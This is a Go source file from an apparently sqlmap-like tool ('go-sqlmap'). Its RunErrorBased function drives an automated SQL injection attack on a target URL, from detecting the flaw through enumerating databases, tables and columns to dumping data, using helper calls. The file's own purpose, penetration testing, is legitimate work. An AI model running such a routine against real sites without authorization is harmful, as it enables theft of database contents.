package start

import (
	"go-sqlmap/constant"
	"go-sqlmap/core"
	"go-sqlmap/util"
)

func RunErrorBased(target string, params core.Input) bool {
	core.DetectErrorBasedSqlInject(target, constant.DefaultMethod)
	success, suffix := core.GetSuffix(params.Url)
	if !success {
		return false
	}
	key := core.GetOrderByNum(suffix, target)
	cleanUrl := util.GetCleanUrl(target)
	pos := core.GetUnionSelectPos(suffix, cleanUrl, key)
	core.GetVersion(pos, suffix, cleanUrl, key)
	core.GetCurrentDatabase(pos, suffix, cleanUrl, key)
	core.GetAllDatabases(pos, suffix, cleanUrl, key)
	if params.Database != "" {
		core.GetAllTables(pos, suffix, cleanUrl, key, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		core.GetColumns(pos, suffix, cleanUrl, key, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		core.GetData(pos, suffix, cleanUrl, key, params.Database, params.Table, params.Columns)
	}
	return true
}
